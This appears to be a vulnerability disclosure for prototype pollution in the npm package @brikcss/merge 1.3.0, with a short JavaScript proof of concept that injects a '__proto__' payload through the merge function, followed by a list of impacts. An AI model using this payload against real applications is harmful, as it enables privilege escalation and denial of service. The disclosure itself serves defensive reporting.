# 🚨 Prototype Pollution in [brikcss/merge](https://www.npmjs.com/package/@brikcss/merge) 

Version: 1.3.0


## 📝 Description
The `@brikcss/merge` package is vulnerable to **Prototype Pollution** - a critical security vulnerability that allows attackers to inject arbitrary properties into JavaScript's global object prototype. This occurs because the merge function recursively processes objects without properly sanitizing special keys like `__proto__`, `constructor.prototype`, and `prototype`.

When an attacker controls the source object being merged, they can inject properties into `Object.prototype`, affecting all objects in the application.

## Proof of Concept (PoC)

```js
const merge = require('./merge.js');

let obj = {};
let ob2j = {};
console.log('Before:', obj.polluted); // undefined
const malicious = JSON.parse('{"__proto__": {"polluted": true}}');

merge(obj, malicious);

console.log('After:', obj.polluted); // true 
console.log(ob2j.polluted) // true
```

№№ Impact
This vulnerability can lead to:

Privilege escalation - injecting isAdmin: true into all objects

Denial of Service - overriding critical object methods

Unexpected application behavior - polluting objects across the entire application

Remote Code Execution - in combination with other vulnerabilities
